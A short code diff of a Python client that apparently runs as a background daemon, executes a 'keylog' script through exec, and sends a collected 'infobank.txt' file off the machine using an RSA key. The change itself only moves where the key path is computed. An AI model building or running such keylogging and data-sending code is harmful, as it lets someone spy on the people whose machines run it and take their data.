@@ -45,6 +45,11 @@ from logzero import logger
 
 logzero.logfile("clientLogger.log", maxBytes=1e6, backupCount=2)
 
+cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
+keyLoc = cwd
+keyLoc +=  '/test_rsa.key'
+
+
 def getInput():
     '''
     This function handles the input and validation of the program. 
@@ -155,6 +160,7 @@ def keylog(filepath, globals=None, locals=None):
         "__file__": filepath,
         "__name__": "__main__",
     })
+    globals.update({"_CWD_":cwd})
     with open(filepath, 'rb') as file:
         exec(compile(file.read(), filepath, 'exec'), globals, locals)
     return 0
@@ -206,9 +212,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     @params - standard logging vars
     '''
     
-    cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
-    keyLoc = cwd
-    keyLoc +=  '/test_rsa.key'
+
     
     infoBank = getInput()
     sendFile(infoBank,  keyLoc,  'infobank.txt')
